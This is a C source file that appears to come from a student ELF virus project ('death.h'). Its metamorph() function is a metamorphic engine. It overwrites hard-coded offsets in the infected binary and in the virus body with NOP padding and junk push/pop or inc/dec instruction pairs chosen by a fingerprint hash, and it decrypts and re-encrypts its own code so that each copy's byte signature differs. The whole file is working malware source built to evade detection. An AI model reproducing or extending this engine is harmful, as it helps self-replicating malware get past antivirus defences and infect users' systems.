#include "death.h"

unsigned char	hash_fingerprint(int fingerprint, int nb)
{
	int hash = 5381;
	while (nb > 0)
	{
		hash = hash * 33 + (fingerprint & 0xFF);
		hash = hash * 33 + ((fingerprint & 0xFF00) >> 8);
		hash = hash * 33 + ((fingerprint & 0xFF0000) >> 16);
		hash = hash * 33 + (fingerprint >> 24);
		nb--;
	}
	return ((char)hash);
}

void			metamorph(t_info *info, t_fingerprint *fingerprint)
{
	uint32_t	tab_push[16];
	uint32_t	tab_pop[16];
	uint32_t	tab_inc[16];
	uint32_t	tab_dec[16];
	size_t		tab_offset[18];
// 	char c = 'c';
// 	ft_syswrite(1, &c, 1);

	tab_push[0] = 0x50; //rax
	tab_push[1] = 0x51; //rcx
	tab_push[2] = 0x52; //rdx
	tab_push[3] = 0x53; //rbx
	tab_push[4] = 0x54; //rsp
	tab_push[5] = 0x55; //rbp
	tab_push[6] = 0x56; //rsi
	tab_push[7] = 0x57; //rdi
	tab_push[8] = 0x5041; //r8
	tab_push[9] = 0x5141; //r9
	tab_push[10] = 0x5241; //r10
	tab_push[11] = 0x5341; //r11
	tab_push[12] = 0x5441; //r12
	tab_push[13] = 0x5541; //r13
	tab_push[14] = 0x5641; //r14
	tab_push[15] = 0x5741; //r15

	tab_pop[0] = 0x58; //rax
	tab_pop[1] = 0x59; //rcx
	tab_pop[2] = 0x5a; //rdx
	tab_pop[3] = 0x5b; //rbx
	tab_pop[4] = 0x5c; //rsp
	tab_pop[5] = 0x5d; //rbp
	tab_pop[6] = 0x5e; //rsi
	tab_pop[7] = 0x5f; //rdi
	tab_pop[8] = 0x5841; //r8
	tab_pop[9] = 0x5941; //r9
	tab_pop[10] = 0x5a41; //r10
	tab_pop[11] = 0x5b41; //r11
	tab_pop[12] = 0x5c41; //r12
	tab_pop[13] = 0x5d41; //r13
	tab_pop[14] = 0x5e41; //r14
	tab_pop[15] = 0x5f41; //r15

	tab_inc[0] = 0xc0ff48; //rax
	tab_inc[1] = 0xc1ff48; //rcx
	tab_inc[2] = 0xc2ff48; //rdx
	tab_inc[3] = 0xc3ff48; //rbx
	tab_inc[4] = 0xc4ff48; //rsp
	tab_inc[5] = 0xc5ff48; //rbp
	tab_inc[6] = 0xc6ff48; //rsi
	tab_inc[7] = 0xc7ff48; //rdi
	tab_inc[8] = 0xc0ff49; //r8
	tab_inc[9] = 0xc1ff49; //r9
	tab_inc[10] = 0xc2ff49; //r10
	tab_inc[11] = 0xc3ff49; //r11
	tab_inc[12] = 0xc4ff49; //r12
	tab_inc[13] = 0xc5ff49; //r13
	tab_inc[14] = 0xc6ff49; //r14
	tab_inc[15] = 0xc7ff49; //r15

	tab_dec[0] = 0xc8ff48; //rax
	tab_dec[1] = 0xc9ff48; //rcx
	tab_dec[2] = 0xcaff48; //rdx
	tab_dec[3] = 0xcbff48; //rbx
	tab_dec[4] = 0xccff48; //rsp
	tab_dec[5] = 0xcdff48; //rbp
	tab_dec[6] = 0xceff48; //rsi
	tab_dec[7] = 0xcfff48; //rdi
	tab_dec[8] = 0xc8ff49; //r8
	tab_dec[9] = 0xc9ff49; //r9
	tab_dec[10] = 0xcaff49; //r10
	tab_dec[11] = 0xcbff49; //r11
	tab_dec[12] = 0xccff49; //r12
	tab_dec[13] = 0xcdff49; //r13
	tab_dec[14] = 0xceff49; //r14
	tab_dec[15] = 0xcfff49; //r15

	tab_offset[0] = (size_t)(info->text_begin + info->text_size + 0x1c);
	tab_offset[1] = (size_t)(info->text_begin + info->text_size + 0x2c);
	tab_offset[2] = (size_t)(info->text_begin + info->text_size + 0x47);
	tab_offset[3] = (size_t)(info->text_begin + info->text_size + 0x8f);
	tab_offset[4] = (size_t)(info->text_begin + info->text_size + 0xd1);

	tab_offset[5] = (size_t)(info->file + info->offset_bis + 0x23);
	tab_offset[6] = (size_t)(info->file + info->offset_bis + 0x50);
	tab_offset[7] = (size_t)(info->file + info->offset_bis + 0x6d);
	tab_offset[8] = (size_t)(info->file + info->offset_bis + 0xce);
	tab_offset[9] = (size_t)(info->file + info->offset_bis + 0x132);
	tab_offset[10] = (size_t)(info->file + info->offset_bis + 0x1ca);
	tab_offset[11] = (size_t)(info->file + info->offset_bis + 0x24a);
	tab_offset[12] = (size_t)(info->file + info->offset_bis + 0x25a);
	tab_offset[13] = (size_t)(info->file + info->offset_bis + 0x2ba);
	tab_offset[14] = (size_t)(info->file + info->offset_bis + 0x2e8);
	tab_offset[15] = (size_t)(info->file + info->offset_bis + 0x377);
	tab_offset[16] = (size_t)(info->file + info->offset_bis + 0x3e8);
	tab_offset[17] = (size_t)(info->file + info->offset_bis + 0x488);

	int		i = 0;
	unsigned char	ret = 0;
	unsigned char	i_regs = 0;
	unsigned char	i_tab = 0;
	uint32_t key = decrypt_func(info, &hash_fingerprint, info->tab_addr[21] - info->tab_addr[20], 20);

	while (i < 18)
	{

		ret = hash_fingerprint(fingerprint->fingerprint, i);
		i_regs = ret & 0xF;
		i_tab = (ret & 0x10) >> 4;
		ft_memset((void*)tab_offset[i], 0x6, '\x90');
		if (i_tab == 0)
		{
			int		len = 0;
			if (i_regs < 8)
				len = 0x1;
			else
				len = 0x2;
			if (((ret & 0x60) >> 5) == 0) // nop en bas
			{
				ft_memcpy((void*)tab_offset[i], &tab_push[i_regs], len);
				ft_memcpy((void*)tab_offset[i] + len, &tab_pop[i_regs], len);
			}
			else if (((ret & 0x60) >> 5) == 1) // nop en haut
			{
				ft_memcpy((void*)tab_offset[i] + (6 - (2 * len)), &tab_push[i_regs], len);
				ft_memcpy((void*)tab_offset[i] + (6 - len), &tab_pop[i_regs], len);
			}
			else if (((ret & 0x60) >> 5) == 2) // nop entre
			{
				ft_memcpy((void*)tab_offset[i], &tab_push[i_regs], len);
				ft_memcpy((void*)tab_offset[i] + (6 - len), &tab_pop[i_regs], len);
			}
			else if (((ret & 0x60) >> 5) == 3) // nop ext
			{
				ft_memcpy((void*)tab_offset[i] + (3 - len) , &tab_push[i_regs], len);
				ft_memcpy((void*)tab_offset[i] + 3, &tab_pop[i_regs], len);
			}
		}
		else if (i_tab == 1)
		{
			if (((ret & 0x80) >> 7) == 0)
			{
				ft_memcpy((void*)tab_offset[i], &tab_inc[i_regs], 0x3);
				ft_memcpy((void*)tab_offset[i] + 0x3, &tab_dec[i_regs], 0x3);
			}
			else
			{
				ft_memcpy((void*)tab_offset[i], &tab_dec[i_regs], 0x3);
				ft_memcpy((void*)tab_offset[i] + 0x3, &tab_inc[i_regs], 0x3);
			}
		}
		i++;
	}
	reencrypt_func(info, &hash_fingerprint, info->tab_addr[21] - info->tab_addr[20], key);
	return ;
}
